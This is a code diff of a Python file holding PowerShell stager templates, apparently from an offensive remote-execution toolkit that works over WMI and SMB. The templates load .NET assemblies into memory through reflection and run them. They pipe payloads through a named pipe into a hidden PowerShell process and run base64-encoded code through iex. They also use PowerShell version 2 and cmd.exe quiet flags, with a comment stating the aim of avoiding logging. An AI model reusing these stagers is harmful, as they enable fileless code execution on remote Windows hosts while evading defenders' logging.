@@ -86,6 +86,7 @@ $a=$x.ReadBytes({size});
 $x.Close();
 [Reflection.Assembly]::Load($a).GetTypes()[0].GetMethods()[0].Invoke($null,@());
 exit;
+\r\n
 '''
 
 PIPE_STAGER_TEMPLATE = '''
@@ -95,18 +96,26 @@ $p.WaitForConnection();
 $pr = New-Object System.Diagnostics.Process -Property @{{
     StartInfo = New-Object System.Diagnostics.ProcessStartInfo -Property @{{
         FileName = '{powershell}';
+        Arguments = '-';
         UseShellExecute = $false;
         RedirectStandardInput = $true;
         WindowStyle = 1;
     }};
 }};
 $pr.Start();
-$p.CopyTo($pr.StandardInput.BaseStream);
+
+do {{
+  [byte[]]$buff = new-object byte[] 4096;
+  $count = $p.Read($buff, 0, $buff.Length);
+  $pr.StandardInput.BaseStream.Write($buff, 0, $count);
+}} while ($count -gt 0);
+
 $pr.StandardInput.Close();
 }} finally {{
-$p.Close();
+if ($p) {{$p.Close();}};
 exit;
 }}
+\r\n
 '''
 
 PIPE_STDOUT_TEMPLATE = '''
@@ -174,12 +183,13 @@ $OutEvent.Name, $ErrEvent.Name |
 $x.Flush();
 $x.Close();
 exit;
+\r\n
 '''
 
 POWERSHELL_CMD_TEMPLATE_STD = '{powershell} -version 2 -noninteractive -EncodedCommand "{cmd}"'
 # Avoid logging (a bit)
 POWERSHELL_CMD_TEMPLATE_CMD = 'cmd.exe /Q /D /S /c "echo:iex([System.Text.Encoding]::ASCII.GetString(' \
-    '[Convert]::FromBase64String("{cmd}"))) | {powershell}"'
+    '[Convert]::FromBase64String("{cmd}"))) | {powershell} -"'
 
 POWERSHELL_PATH = r'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe'
 
@@ -397,7 +407,6 @@ class ConnectionInfo(object):
 
             iWbemServices = iWbemLevel1Login.NTLMLogin(namespace, NULL, NULL)
 
-
             if rpc_auth_level == 'privacy':
                 iWbemServices.get_dce_rpc().set_auth_level(
                     RPC_C_AUTHN_LEVEL_PKT_PRIVACY)
@@ -599,7 +608,7 @@ class FileTransfer(object):
                 break
 
             except SessionError as e:
-                if e.getErrorCode() == 0xc0000034:
+                if e.getErrorCode() == 0xC0000034:
                     time.sleep(1)
                 else:
                     raise
